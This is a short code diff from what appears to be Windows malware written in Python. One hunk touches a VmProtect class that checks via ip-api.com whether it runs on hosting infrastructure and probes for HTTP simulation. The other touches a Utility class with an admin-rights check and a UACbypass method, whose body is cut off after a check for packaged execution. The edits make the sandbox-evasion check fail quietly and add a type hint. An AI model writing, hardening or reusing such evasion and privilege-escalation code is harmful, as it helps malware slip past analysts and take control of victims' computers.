@@ -67,7 +67,10 @@ class VmProtect:
     @staticmethod
     def checkHosting() -> bool:
         http = PoolManager()
-        return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
+        try:
+            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
+        except Exception:
+            return False
 
     @staticmethod
     def checkHTTPSimulation() -> bool:
@@ -182,7 +185,7 @@ class Utility:
         return subprocess.run("net session", shell= True, capture_output= True).returncode == 0
     
     @staticmethod
-    def UACbypass(method: int = 1):
+    def UACbypass(method: int = 1) -> None:
         if not hasattr(sys, "frozen"):
             return
         
